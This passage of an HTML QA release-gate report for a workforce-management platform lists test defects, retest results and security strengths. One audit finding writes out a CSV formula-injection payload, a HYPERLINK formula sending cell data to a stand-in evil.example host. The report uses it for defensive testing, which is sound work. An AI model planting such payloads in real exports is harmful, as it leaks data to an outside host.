<style>
/* Layout: a left-aligned release-gate dossier — verdict stamp first, then scorecard, defects, evidence. One column, 1120px max, wide tables scroll in place. */
:root {
  --paper: #f6f7f9; --sheet: #ffffff; --ink: #151a22; --ink-2: #4a5361; --ink-3: #6b7482; --rule: #dde1e7; --rule-2: #eceff3;
  --accent: #1f5c99; --accent-soft: #e6eef7;
  --crit: #a3191b; --crit-bg: #fbe9e8; --high: #b4470c; --high-bg: #fdeee3; --med: #8a6100; --med-bg: #fbf3dc; --low: #3f6b2a; --low-bg: #ebf4e4; --info: #4f5a6b; --info-bg: #eef0f3;
  --pass: #2f7a3a; --fail: #b3261e;
  --display: "Archivo", "Arial Narrow", system-ui, sans-serif; --body: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif; --mono: "IBM Plex Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
}
@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) {
  --paper: #0f1318; --sheet: #161b22; --ink: #e8ecf1; --ink-2: #b4bcc8; --ink-3: #8b94a3; --rule: #2a313b; --rule-2: #20262e; --accent: #7fb2e8; --accent-soft: #1b2a3b;
  --crit: #ff8a80; --crit-bg: #3a1716; --high: #ffab73; --high-bg: #3a2416; --med: #f0c75e; --med-bg: #342a12; --low: #9fd38a; --low-bg: #1d2e17; --info: #b4bcc8; --info-bg: #222932; --pass: #8fd49a; --fail: #ff8a80; color-scheme: dark } }
:root[data-theme="dark"] {
  --paper: #0f1318; --sheet: #161b22; --ink: #e8ecf1; --ink-2: #b4bcc8; --ink-3: #8b94a3; --rule: #2a313b; --rule-2: #20262e; --accent: #7fb2e8; --accent-soft: #1b2a3b;
  --crit: #ff8a80; --crit-bg: #3a1716; --high: #ffab73; --high-bg: #3a2416; --med: #f0c75e; --med-bg: #342a12; --low: #9fd38a; --low-bg: #1d2e17; --info: #b4bcc8; --info-bg: #222932; --pass: #8fd49a; --fail: #ff8a80; color-scheme: dark }
* { box-sizing: border-box }
body { background: var(--paper); color: var(--ink); font: 15px/1.55 var(--body); padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); padding-block: 28px 64px }
.wrap { max-width: 1120px; margin: 0 auto; display: grid; gap: 40px }
h1, h2, h3 { font-family: var(--display); font-stretch: 82%; letter-spacing: -0.01em; text-wrap: balance; margin: 0; line-height: 1.12 }
h1 { font-size: clamp(30px, 5vw, 46px); font-weight: 800 }
h2 { font-size: 24px; font-weight: 700 }
h3 { font-size: 17px; font-weight: 700 }
p { margin: 0; max-width: 72ch }
.eyebrow { font: 600 11.5px/1 var(--body); letter-spacing: .09em; text-transform: uppercase; color: var(--ink-3) }
.mono, code, .num { font-family: var(--mono); font-variant-numeric: tabular-nums }
code { font-size: .88em; background: var(--rule-2); padding: 1px 5px; border-radius: 4px; overflow-wrap: anywhere }
a { color: var(--accent) }
:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px }
section { display: grid; gap: 16px; min-width: 0 }
.sec-head { display: grid; gap: 6px; border-top: 2px solid var(--ink); padding-top: 12px }
.sec-head p { color: var(--ink-2) }

/* header + verdict */
.top { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 28px; align-items: start }
.meta { display: flex; flex-wrap: wrap; gap: 6px 18px; color: var(--ink-2); font-size: 13.5px; margin-top: 10px }
.stamp { border: 3px solid var(--crit); color: var(--crit); padding: 10px 18px 12px; border-radius: 6px; transform: rotate(-2deg); text-align: center; background: var(--sheet); min-width: 190px }
.stamp.go { border-color: var(--pass); color: var(--pass) }
.stamp.cond { border-color: var(--high); color: var(--high) }
.stamp.cond b { font-size: 30px }
.rt { display: inline-flex; align-items: center; font: 600 11.5px/1 var(--body); padding: 4px 8px; border-radius: 4px; white-space: nowrap; border: 1px solid currentColor }
.rt-Fixed { color: var(--pass) } .rt-Partly { color: var(--med) } .rt-Still { color: var(--fail) } .rt-New { color: var(--accent) }
.rtgrid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); border: 1px solid var(--rule); background: var(--sheet); border-radius: 8px }
.rtgrid .fig { border-right: 1px solid var(--rule-2) }
.stamp b { display: block; font: 800 40px/1 var(--display); font-stretch: 75%; letter-spacing: .02em }
.stamp span { font-size: 12px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase }
.lede { font-size: 17px; color: var(--ink); max-width: 80ch }
.sevrow { display: flex; flex-wrap: wrap; gap: 8px }
.sev { display: inline-flex; align-items: center; gap: 6px; font: 600 12px/1 var(--body); padding: 5px 9px; border-radius: 999px; white-space: nowrap }
.sev i { width: 7px; height: 7px; border-radius: 50%; background: currentColor; display: inline-block }
.s-Critical { color: var(--crit); background: var(--crit-bg) } .s-High { color: var(--high); background: var(--high-bg) } .s-Medium { color: var(--med); background: var(--med-bg) } .s-Low { color: var(--low); background: var(--low-bg) } .s-Info { color: var(--info); background: var(--info-bg) }

/* figures */
.figs { display: grid; grid-template-columns: repeat(auto-fit, minmax(170px, 1fr)); border: 1px solid var(--rule); background: var(--sheet); border-radius: 8px }
.fig { padding: 16px 18px; border-right: 1px solid var(--rule-2); display: grid; gap: 4px; align-content: start }
.fig:last-child { border-right: 0 }
.fig b { font: 700 28px/1 var(--display); font-stretch: 85% }
.fig small { color: var(--ink-2); font-size: 12.5px }

/* must-fix */
.mustfix { display: grid; gap: 0; border: 1px solid var(--rule); border-radius: 8px; background: var(--sheet); overflow: hidden }
.mf { display: grid; grid-template-columns: 74px 92px minmax(0, 1fr); gap: 12px; padding: 11px 16px; border-top: 1px solid var(--rule-2); align-items: baseline }
.mf:first-child { border-top: 0 }
.mf .t { font-weight: 600 } .mf .a { color: var(--ink-3); font-size: 12.5px }

/* tables */
.tbl { overflow-x: auto; border: 1px solid var(--rule); border-radius: 8px; background: var(--sheet) }
table { border-collapse: collapse; width: 100%; font-size: 13.5px }
th, td { text-align: left; padding: 9px 12px; border-top: 1px solid var(--rule-2); vertical-align: top }
thead th { border-top: 0; font: 600 11.5px/1.2 var(--body); letter-spacing: .06em; text-transform: uppercase; color: var(--ink-3); background: var(--sheet); position: sticky; top: 0 }
td.n, th.n { text-align: right; font-family: var(--mono); font-variant-numeric: tabular-nums; white-space: nowrap }
.ok { color: var(--pass); font-weight: 600 } .bad { color: var(--fail); font-weight: 600 }
.bar { display: inline-block; height: 8px; background: var(--accent); border-radius: 2px; vertical-align: middle; margin-left: 6px; opacity: .75 }
.bar.warn { background: var(--high) }

/* defects */
.filters { display: flex; flex-wrap: wrap; gap: 8px; align-items: center }
.chip { font: 600 12.5px/1 var(--body); border: 1px solid var(--rule); background: var(--sheet); color: var(--ink-2); padding: 7px 11px; border-radius: 999px; cursor: pointer }
.chip[aria-pressed="true"] { background: var(--ink); color: var(--paper); border-color: var(--ink) }
.search { font: 14px var(--body); padding: 7px 11px; border: 1px solid var(--rule); border-radius: 6px; background: var(--sheet); color: var(--ink); min-width: 0; flex: 1 1 220px; max-width: 340px }
.defects { display: grid; gap: 8px }
details.d { background: var(--sheet); border: 1px solid var(--rule); border-left: 4px solid var(--rule); border-radius: 6px }
details.d.Critical { border-left-color: var(--crit) } details.d.High { border-left-color: var(--high) } details.d.Medium { border-left-color: var(--med) } details.d.Low { border-left-color: var(--low) } details.d.Info { border-left-color: var(--info) }
details.d summary { list-style: none; cursor: pointer; display: grid; grid-template-columns: 70px 86px minmax(0, 1fr) auto; gap: 12px; padding: 11px 14px; align-items: baseline }
details.d summary::-webkit-details-marker { display: none }
details.d summary .area { color: var(--ink-3); font-size: 12.5px; text-align: right }
details.d[open] summary { border-bottom: 1px solid var(--rule-2) }
.dl { display: grid; grid-template-columns: 130px minmax(0, 1fr); gap: 8px 14px; padding: 12px 14px 14px; font-size: 13.5px }
.dl dt { color: var(--ink-3); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: .05em; padding-top: 2px }
.dl dd { margin: 0; overflow-wrap: anywhere }

.two { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 16px }
.list { margin: 0; padding-left: 20px; display: grid; gap: 8px; max-width: 90ch }
.note { color: var(--ink-2); font-size: 13.5px }
pre { font: 12.5px/1.5 var(--mono); background: var(--sheet); border: 1px solid var(--rule); border-radius: 6px; padding: 12px 14px; overflow-x: auto; margin: 0 }
.toc { display: flex; flex-wrap: wrap; gap: 6px 14px; font-size: 13px }
.toc a { color: var(--ink-2); text-decoration: none; border-bottom: 1px solid var(--rule) }
.toc a:hover { color: var(--accent) }
@media (max-width: 760px) {
  .top { grid-template-columns: 1fr } .stamp { justify-self: start }
  .two { grid-template-columns: 1fr }
  .mf { grid-template-columns: 64px minmax(0, 1fr) } .mf .a { grid-column: 2 }
  details.d summary { grid-template-columns: 62px minmax(0, 1fr) } details.d summary .sev { grid-column: 2; justify-self: start } details.d summary .area { grid-column: 2; text-align: left }
  .dl { grid-template-columns: 1fr } .fig { border-right: 0; border-bottom: 1px solid var(--rule-2) }
}
@media (prefers-reduced-motion: reduce) { * { transition: none !important } }
</style>

s","heading":"API & Single Sign-On","loadMs":1220,"crashed":false,"pageErrors":0,"apiErrors":[],"a11yCritical":0,"a11ySerious":5,"shot":"administration-api-access.png"},{"url":"/administration/alerts-reports","heading":"Alerts & Reports","loadMs":1218,"crashed":false,"pageErrors":0,"apiErrors":[],"a11yCritical":6,"a11ySerious":1,"shot":"administration-alerts-reports.png"},{"url":"/forecasting/forecast-builder","heading":"Forecast Builder","loadMs":3912,"crashed":false,"pageErrors":0,"apiErrors":[],"a11yCritical":0,"a11ySerious":6,"shot":"forecasting-forecast-builder.png"},{"url":"/forecasting/adjustments","heading":"Adjustments","loadMs":1384,"crashed":false,"pageErrors":0,"apiErrors":[],"a11yCritical":0,"a11ySerious":1,"shot":"forecasting-adjustments.png"}],"defects":[{"id":"DEF-01","sev":"Critical","area":"Security · Administration","title":"A disabled user's existing session keeps working","steps":"Create user → sign in (token) → admin sets status DISABLED → call GET /api/v1/workforce/employees with the old token","expected":"401/403 at once","actual":"200 OK — the token works until it expires (JWT_TTL=12h). New sign-ins are refused correctly.","evidence":"api-functional › Audit & Administration (existing session of disabled user is cut off → 200)","fix":"In authenticate(), reject tokens whose user is no longer ACTIVE (cache status in Redis for a few seconds), or keep a per-user token version and bump it on disable/role change/password reset.","retest":{"status":"Fixed","note":"Old token refused straight after the account is disabled: 200 before, 401 immediately after and 6 s later."}},{"id":"DEF-14","sev":"Critical","area":"Reliability · Engine (scheduling)","title":"Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down","steps":"Seen twice: (1) during scripts/demo-seed.mjs (forecast → schedule); (2) during the gateway's own test run, seconds after 'cancel stops a running build inside the engine' passed, while the next multi-group solve ran","expected":"A failed solve fails that one request; the engine keeps serving","actual":"'Fatal Python error: Aborted' in ortools cp_model.Solve (backend/engine/scheduling.py:465, solve_cpsat) with the new cancel watchdog thread (scheduling.py:459, solver.StopSearch from another thread) alive. The whole process dies: every forecast and schedule request then returns 503 until someone restarts it. Earlier dead engines also left 3 hung server.py processes (each with 4 workers) running. Not reproduced on demand: 3 rounds of start → cancel → solve passed","evidence":"engine-crash-1.log (native stack of all threads); gateway-suite.txt (12 tests failed with ENGINE_UNAVAILABLE after the crash); /health engine:false","fix":"Run each CP-SAT solve in a child process (the ProcessPool already exists) so a native abort kills one job, not the server; re-check the uncommitted StopSearch-from-watchdog change (prefer a solution-callback stop or the solver's own time limit); run the engine under a supervisor that restarts it and kills the whole process tree; alert on /health engine:false.","retest":{"status":"Fixed","note":"Crash injection: the CP-SAT solver process was killed mid-build. The engine stayed up (0 restarts), the build fell back to HiGHS and finished DONE (\"cpsat: failed (the solver process ended without an answer)\", \"highs: feasible\"). Each solve now runs in its own process."}},{"id":"DEF-02","sev":"High","area":"Workforce · Time off","title":"Admin can book overlapping time off for the same person","steps":"POST /workforce/time-off for an employee (15–16 days out), approve → POST another for days 16–17","expected":"400/409 overlap (self-service already blocks this: 'You already have … that overlaps these dates')","actual":"201 Created — double-booked leave, double-counted balance and pay","evidence":"api-functional › Workforce (overlapping time off rejected → 201)","fix":"Run the same overlap check used by POST /me/time-off inside POST /workforce/time-off (and in bulk/import paths).","retest":{"status":"Fixed","note":"A second, overlapping admin booking now returns 409 with a clear message naming the existing vacation."}},{"id":"DEF-03","sev":"High","area":"Security · Configuration","title":"Administrator uses a password on the app's own blocklist and is never asked to change it","steps":"Sign in as admin (tenant ORG)","expected":"Strong password; temporary/bootstrap passwords force a change","actual":"Password is in EASY list of passwordPolicy.ts and contains the username; mustChangePassword=false","evidence":"api-security SEC-01","fix":"Rotate before go-live. Apply checkNewPassword() to BOOTSTRAP_ADMIN_PASSWORD and set must_change_password=true for the bootstrap admin.","retest":{"status":"Still open","note":"Admin still signs in with the blocklisted bootstrap password and is not asked to change it (mustChangePassword=false). SEC-01 fails."}},{"id":"DEF-04","sev":"High","area":"Admin UI · Command palette","title":"Ctrl+K search shows fake prototype records and cannot find real ones","steps":"Press Ctrl+K → type 'Jane' / 'Demo Support' / 'Shift Templates'","expected":"Live employees, groups and screens","actual":"'Jane Doe · EMP-1024 · Customer Billing' (does not exist); real group and screen names: 'No matching records'","evidence":"admin-e2e A-04, screens/palette-fake-data.png; src/components/common/CommandPalette.tsx uses SEED_EMPLOYEES/SEED_WFM_GROUPS/SEED_SKILLS from src/services/wfmStore.ts","fix":"Search the API (or the loaded stores) and the route list; delete the SEED_* data from the production bundle.","retest":{"status":"Fixed","note":"Prototype SEED_ data is gone. In the live palette \"Jane\" and \"Voice Inbound\" now find nothing, while \"Agent1\" lists the real employees, \"Demo Support\" the real group and \"Shift Templates\" the screen; Enter opens the result."}},{"id":"DEF-05","sev":"High","area":"Accessibility","title":"Admin sidebar cannot be used with a keyboard or screen reader","steps":"Load any admin screen → press Tab repeatedly","expected":"Every navigation item is focusable (links/buttons)","actual":"Only 1 focus stop in the sidebar in 40 Tabs — items are \u003cdiv onClick> with no role or tabindex","evidence":"admin-e2e A-03; src/components/layout/NavigationSidebar.tsx","fix":"Render items as \u003ca href> (they already have URLs) or \u003cbutton>, with aria-current on the active one.","retest":{"status":"Fixed","note":"Sidebar items are now focusable buttons: Tab reaches Overview, Workforce, Employees, Teams, Skills and the rest (A-03 passes)."}},{"id":"DEF-06","sev":"High","area":"Accessibility","title":"Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical)","steps":"axe-core WCAG 2.1 AA scan of all 51 admin screens","expected":"0 critical violations","actual":"button-name: 530 elements on 51/51 screens; plus select-name and missing form labels on one screen","evidence":"admin-crawl (axe) — see Accessibility section","fix":"Add aria-label to icon buttons (lucide icons inside \u003cbutton>), label selects/inputs.","retest":{"status":"Partly fixed","note":"Unnamed buttons are gone: 530 elements on 51 screens down to 0. Still 6 form fields without labels on Administration > Alerts & reports (critical \"label\" rule)."}},{"id":"DEF-07","sev":"High","area":"Release · Licensing","title":"AG Grid Enterprise runs without a licence key","steps":"Open Workforce › Employees (console)","expected":"Licensed grid, no watermark","actual":"Console prints the AG Grid Enterprise licence banner; grids show the trial watermark","evidence":"admin-crawl console errors on Employees, Time Off, Attendance, Timeline, Live coverage, Activities","fix":"Set VITE_AG_GRID_LICENSE for the production build (or switch to the Community edition). Using Enterprise in production unlicensed breaches the licence.","retest":{"status":"Still open","note":"ag-grid-enterprise is still a dependency, there is no licence key in any env file, and the licence banner is still logged on 4 screens (Employees, Time off, Attendance, Activities)."}},{"id":"DEF-08","sev":"Medium","area":"Security · Audit export","title":"CSV formula injection in the audit export","steps":"Create a team named =HYPERLINK(\"http://evil.example/?x=\"&A1,\"x\") → download /audit/export.csv","expected":"Cell neutralised ('=…)","actual":"Written raw: \"=HYPERLINK(\"\"http://evil.example/…\"\")\" — runs when opened in Excel","evidence":"api-security SEC-14","fix":"Reuse csvCell from modules/reports.ts (prefix = + - @ with ') in auditRoutes.ts and integrations/runner.ts and any other CSV writer.","retest":{"status":"Fixed","note":"The audit CSV now writes the team name with a leading apostrophe ('=HYPERLINK...), so spreadsheets show it as text."}},{"id":"DEF-09","sev":"Medium","area":"Security · Sessions","title":"Session token accepted in the URL (?token=) on every REST route","steps":"GET /api/v1/users?token=\u003cjwt>","expected":"401 (header only)","actual":"200; the web app also opens /ws?token=\u003cjwt>","evidence":"api-security SEC-05","fix":"Accept ?token= only on the WebSocket upgrade, ideally with a short-lived single-use ticket instead of the session JWT; strip it from access logs.","retest":{"status":"Fixed","note":"GET /users?token=\u003cvalid JWT> now returns 401."}},{"id":"DEF-10","sev":"Medium","area":"Security · Sign-in","title":"Response time reveals whether a username exists","steps":"POST /auth/login with a wrong password for a real vs an unknown username (5 each)","expected":"Same timing","actual":"Real user median ≈ 808 ms, unknown ≈ 11 ms (bcrypt only runs for real users)","evidence":"api-security SEC-07","fix":"When no user is found, bcrypt.compare against a fixed dummy hash before failing.","retest":{"status":"Fixed","note":"Median sign-in time is 293 ms for a real user and 301 ms for an unknown one."}},{"id":"DEF-11","sev":"Medium","area":"API · Validation","title":"Impossible calendar date returns 500 and leaks the PostgreSQL error","steps":"POST /me/time-off {startDate:'2026-02-30', endDate:'2026-02-30'}","expected":"400 'not a valid date'","actual":"500 'date/time field value out of range: \"2026-02-30\"'","evidence":"api-security SEC-15","fix":"isoDay is a regex only — add a real-date refine to the shared isoDay schema (affects every date input), and never return raw DB messages on 500.","retest":{"status":"Fixed","note":"2026-02-30 now returns 400 \"One of the values is not valid (check dates and numbers).\" with no database text."}},{"id":"DEF-12","sev":"Medium","area":"Audit","title":"Failed sign-in attempts are not written to the audit log","steps":"Fail a sign-in for admin → search audit","expected":"LOGIN_FAILED entry with IP","actual":"Only successful LOGIN is audited (lockouts are in Redis only)","evidence":"api-functional › Audit","fix":"Audit failed attempts and lockouts (needed for SOC 2 / ISO 27001 evidence).","retest":{"status":"Fixed","note":"A failed admin sign-in now appears in the audit log."}},{"id":"DEF-13","sev":"Medium","area":"Performance · Forecasting","title":"Forecast Builder takes ~34 s to finish loading","steps":"Open /forecasting/forecast-builder for Demo Support (10 weeks of history, one queue)","expected":"\u003c 3 s","actual":"GET /forecast/history-quality takes 15–32 s and is requested twice on every load","evidence":"performance PERF-03 + request timing","fix":"Cache history-quality per group/version, compute it in the background, and de-duplicate the request in the screen.","retest":{"status":"Fixed","note":"History-quality API answers in 21 ms (2 ms cached); Forecast Builder settles in 6.6 s on the dev server (was about 34 s)."}},{"id":"DEF-15","sev":"Medium","area":"Performance","title":"Admin JavaScript is a single 4.2 MB chunk (1.18 MB gzipped)","steps":"vite build","expected":"Route-level code splitting, main chunk \u003c 500 kB","actual":"index.js 4,234 kB + exceljs 940 kB; Vite warns about chunk size","evidence":"static/build-admin.txt","fix":"Lazy-load each module screen (React.lazy) and exceljs/recharts/ag-grid only where used.","retest":{"status":"Fixed","note":"Screens are now lazy-loaded: entry chunk 282 kB (87 kB gzip) across 35 chunks. AG Grid (2.7 MB) and exceljs (940 kB) load only on screens that use them."}},{"id":"DEF-16","sev":"Medium","area":"Performance · Scale","title":"Employee list is not paginated","steps":"GET /workforce/employees (≈ 420 people)","expected":"Paged/filtered","actual":"328 kB per call; 40 req/s with p95 627 ms at 25 concurrent","evidence":"performance PERF-01/02","fix":"Server-side paging and field selection; the grid can use the AG Grid server-side row model.","retest":{"status":"Partly fixed","note":"?limit= and ?offset= are now accepted, but paging happens after a capped 2,000-row load: x-total-count says 2000 on a 50,656-person tenant, offset 40000 returns 0 rows, and 50 rows cost the same ~500 ms as 2,000. Push LIMIT/OFFSET (or keyset paging) into the SQL and return the true total (see scale DEF-29)."}},{"id":"DEF-17","sev":"Medium","area":"Employee portal · Mobile","title":"Portal is not usable on a phone browser","steps":"Open localhost:3001 at 412 px width (Pixel 7)","expected":"Responsive layout / bottom tabs","actual":"Fixed 224 px sidebar leaves 188 px for content; Schedule scrolls sideways","evidence":"responsive R-01, screens/mobile-portal-*.png","fix":"Collapse the sidebar into a bottom tab bar under md breakpoint (same IA as the mobile app).","retest":{"status":"Fixed","note":"At 412 px the portal has no sidebar and no sideways scroll; content uses the full width on every section."}},{"id":"DEF-18","sev":"Medium","area":"Accessibility","title":"Colour contrast below WCAG AA on every screen of both apps","steps":"axe scan","expected":"4.5:1 for text","actual":"822 elements on 51/51 admin screens; portal login and 4/5 sections","evidence":"admin-crawl, portal-e2e P-01/P-03","fix":"Darken #A3A3A3/#737373 secondary text on white/#FAFAF8 backgrounds.","retest":{"status":"Partly fixed","note":"Low-contrast elements roughly halved (822 to 457) but still present on all 51 admin screens; the portal sign-in still has 2."}},{"id":"DEF-19","sev":"Medium","area":"Security · Configuration","title":"NATS TLS certificate checking is switched off","steps":"backend/.env","expected":"NATS_TLS_REJECT_UNAUTHORIZED=true in production","actual":"false","evidence":"backend/.env (value only, no secret read)","fix":"Set to true with a trusted CA for production.","retest":{"status":"Still open","note":"backend/.env still has NATS_TLS_REJECT_UNAUTHORIZED=false."}},{"id":"DEF-43","sev":"Medium","area":"Performance · Intraday","title":"Adherence takes about 2 s per call on a large tenant","steps":"GET /intraday/adherence?groupId=\u003cDemo Support> 15 times, on the tenant that now also holds the 50,656-person scale data","expected":"Close to the first run (p95 23 ms): the group still has the same people","actual":"p50 1,913 ms, p95 2,232 ms. The three SQL queries behind it take about 20 ms in total when run directly as the database owner (row-level security does not apply there), so the time goes on row-level-security checks or work in the gateway. /workforce/employees is 641 ms and 1.6 MB for 2,000 rows, and under 25 parallel requests it manages 1 request per second (p50 15 s, p95 21 s; all 200).","evidence":"performance > PERF-01 (re-run on a restarted gateway); EXPLAIN ANALYZE of the adherence queries in psql","fix":"Profile the endpoint as the app role (RLS on); make sure the RLS policy uses an indexed, STABLE tenant lookup; add an index on employees(primary_group_id) and a GIN index on eligible_group_ids.","retest":{"status":"New","note":"Found in this re-test."}},{"id":"DEF-20","sev":"Low","area":"Employee portal","title":"Offers show an empty group name to the employee","steps":"GET /me/offers as an agent","expected":"groupName 'Demo Support' (as admin sees)","actual":"groupName \"\"","evidence":"api-functional › Self-service","fix":"Join the group name in the /me/offers query.","retest":{"status":"Fixed","note":"Code check: /me/offers now joins wfm_groups and returns group_name. Not seen live, because the demo agent had no open offers during the run."}},{"id":"DEF-21","sev":"Low","area":"Employee portal · UX","title":"No URLs per section: reload always returns to Home, Back leaves the app","steps":"Open Inbox → reload","expected":"Stay on Inbox (admin app already has per-screen URLs)","actual":"Back on Home; nothing can be bookmarked or linked from a notification e-mail","evidence":"portal-e2e P-08","fix":"Use the same History-API routing as src/services/routes.ts.","retest":{"status":"Fixed","note":"Each portal section has its own URL; reloading on /inbox stays on Inbox (P-08 passes)."}},{"id":"DEF-22","sev":"Low","area":"Employee portal · UX","title":"Time-off form accepts end-before-start until it is submitted","steps":"Request time off → Start = day 60, End = day 55","expected":"Inline error, Submit disabled","actual":"Submit enabled; the server's 400 message is shown afterwards","evidence":"portal-e2e P-05","fix":"Validate in the form (it already pre-checks overlaps).","retest":{"status":"Fixed","note":"The form flags an end date before the start date before it is submitted (P-05 passes)."}},{"id":"DEF-23","sev":"Low","area":"Workforce · Validation","title":"Hire date in 2099 is accepted","steps":"POST /workforce/employees hireDate 2099-01-01","expected":"400 (e.g. > 1 year ahead)","actual":"201","evidence":"api-functional › Workforce","fix":"Bound hire dates.","retest":{"status":"Fixed","note":"Hire date 2099-01-01 now returns 400 \"hireDate must be between 1950 and a year from now\"."}},{"id":"DEF-24","sev":"Low","area":"API","title":"Malformed JSON returns error code INTERNAL","steps":"POST /config/groups with body '{\"name\":'","expected":"400 BAD_JSON","actual":"400 with code INTERNAL","evidence":"api-security SEC-12","fix":"Map body-parser SyntaxError to a 400 BAD_REQUEST code.","retest":{"status":"Fixed","note":"Broken JSON now returns 400 BAD_JSON."}},{"id":"DEF-25","sev":"Low","area":"Security · Sign-in","title":"Unauthenticated endpoints reveal account existence and organisation name","steps":"POST /auth/discover {identifier:\u003cemail>}; GET /auth/login-options","expected":"Off in production unless needed","actual":"Returns the organisation for a real e-mail, [] otherwise (rate-limited 15 per 15 min)","evidence":"api-security SEC-08","fix":"Set LOGIN_DISCOVERY=false for production if the org code is distributed another way.","retest":{"status":"Still open","note":"Unchanged (a configuration choice): /auth/discover still returns the organisation for a known login and an empty list for an unknown one; /auth/login-options names the organisation. Set LOGIN_DISCOVERY=false if org codes are handed out another way."}},{"id":"DEF-26","sev":"Low","area":"Both apps","title":"No favicon — 404 on every page load","steps":"GET /favicon.ico on :3000 and :3001","expected":"200","actual":"404 (console error on every screen)","evidence":"admin-crawl console","fix":"Add a favicon to public/.","retest":{"status":"Fixed","note":"Both apps link /favicon.svg, served as image/svg+xml."}},{"id":"DEF-27","sev":"Low","area":"Tooling","title":"scripts/demo-seed.mjs cannot finish","steps":"Run the seed on a stack with FORCE_PASSWORD_CHANGE on (the default)","expected":"Seed completes","actual":"The giveaway step gets 403 'Choose a new password' (new logins are temporary), and a failed step leaves the group behind so the seed refuses to run again","evidence":"qa/seed-finish.mjs works around it","fix":"Change the demo logins' passwords in the seed; make the seed resumable.","retest":{"status":"Fixed","note":"Code check: the seed now handles the forced password change. Not re-run, because it rewrites the demo data."}},{"id":"DEF-44","sev":"Low","area":"Reliability · Gateway","title":"Gateway process ended once with no log line","steps":"Run the API-latency test (12 endpoints x 15 calls) straight after the full suite","expected":"The gateway stays up, or logs why it stopped","actual":"The process ended with exit code 127 and nothing in its log; the test got ECONNRESET. After a restart the same test ran cleanly, so it did not reproduce.","evidence":"The gateway log ends on normal 200 lines; the shell reported exit code 127","fix":"Run the gateway under a process manager that restarts it, and log uncaughtException, unhandledRejection and process exit before quitting.","retest":{"status":"New","note":"Found in this re-test; seen once."}},{"id":"DEF-45","sev":"Low","area":"Tooling · Engine tests","title":"Engine unit tests: 3 of 91 fail after the solver change","steps":"cd backend/engine && python -m pytest -q","expected":"91 passed (as in the first run)","actual":"88 passed, 3 failed. test_a_failing_primary_falls_through_to_the_next_solver and test_every_solver_failing_still_ends_with_the_greedy_roster stub solve_cpsat, but the solver now runs in a separate process the stub never reaches (both pass with ENGINE_ISOLATE_SOLVES=0). test_no_history_changes_nothing is flaky: the same request can give a different roster (it failed 1 of 2 times in-process).","evidence":"pytest output saved as static/pytest-rerun.txt in the QA run folder","fix":"Stub solve_cpsat_isolated (or set ENGINE_ISOLATE_SOLVES=0) in those two tests; fix the CP-SAT random seed and use 1 search worker in the determinism test.","retest":{"status":"New","note":"Found in this re-test."}},{"id":"DEF-28","sev":"Info","area":"Data hygiene","title":"Existing data to clean before go-live","steps":"Configuration › Integration Station; Data Management › Staged imports","expected":"—","actual":"A connector points at nats://192.168.9.81:4222 (TIMEOUT); 6 failed history imports (672–5,000 rows rejected); test employees EXT7172 etc.","evidence":"admin-crawl visible errors","fix":"Start production from a clean database; do not migrate this test data.","retest":{"status":"Still applies","note":"Still a pre-launch housekeeping item. The database now also holds the 50,000-person SCALE test data and QA- records from both runs."}}],"strengths":["Role-based access control: 1,934 role × route checks over 327 guarded routes and 6 roles — no route answered without its permission, no role wrongly blocked, every guarded route returns 401 when signed out.","Token security: alg:none, role-swapped payload, bad signature, expired and garbage tokens all rejected; sign-out revokes the token server-side.","Brute force: sign-in locks after 10 failures per IP+user; password change locks after 5; password policy rejects short, common, username-based and repeated-character passwords.","Injection: SQL-injection probes on sign-in, search and IDs gave no 5xx and no bypass; HTML in names and reasons renders as text (no dangerouslySetInnerHTML anywhere).","Tenant/employee isolation: an agent cannot see, cancel or give away another agent's requests or shifts; mass-assignment fields are ignored.","Validation is strong across configuration (duplicates, time zones, SL > 100 %, queue hours), templates, forecast lifecycle (no publish before approve, no deleting a published forecast) and live feeds (negative volume, future events, unknown agents).","Scheduling quality: published 2-week schedule (282 shifts, 30 people) has 0 double-bookings, ≥ 11 h rest everywhere, ≤ 48 h/week, ≤ 6 days in a row; swap takes are refused when they would break rest/hours rules.","Self-service flows work end-to-end in the portal: forced first-login password change, time off (auto-approval by policy, overlap check), giveaways, VTO accept, overtime decline, inbox, sign-out.","API reads are fast (most 4–55 ms p95) and returned no 5xx under 25-way concurrency.","Headers: Helmet CSP, HSTS, X-Frame-Options, nosniff, no X-Powered-By; CORS allows only the admin origin.","Builds and checks: TypeScript clean in admin, portal and gateway; both production builds succeed; no secrets in the bundles; engine unit suite 91/91."]}</script>
<script>
(() => {
  const D = JSON.parse(document.getElementById('report-data').textContent.replace('/*__DATA__*/', ''));
  const $ = (h) => { const t = document.createElement('template'); t.innerHTML = h.trim(); return t.content; };
  const esc = (s) => String(s ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  const sev = (s) => `<span class="sev s-${s}"><i></i>${s}</span>`;
  const okb = (b, y = 'Pass', n = 'Fail') => `<span class="${b ? 'ok' : 'bad'}">${b ? y : n}</span>`;
  const n = (x) => (x == null || Number.isNaN(x) ? '—' : Number(x).toLocaleString('en-GB'));
  const when = new Date(D.generatedAt);
  const app = document.getElementById('app');
  const sevs = ['Critical', 'High', 'Medium', 'Low', 'Info'];
  const isOpen = (d) => d.retest?.status !== 'Fixed';
  const blockers = D.defects.filter((d) => (d.sev === 'Critical' || d.sev === 'High') && isOpen(d));
  const rtCls = (s) => 'rt-' + String(s ?? '').split(' ')[0];
  const rt = (d) => d.retest ? `<span class="rt ${rtCls(d.retest.status)}">${esc(d.retest.status)}</span>` : '';
  const RT = D.retest;
  const C = D.counts;

  app.append($(`
  <header class="top">
    <div style="display:grid;gap:10px;min-width:0">
      <div class="eyebrow">Production readiness · Enterprise WFM Platform</div>
      <h1>WFM Release Gate</h1>
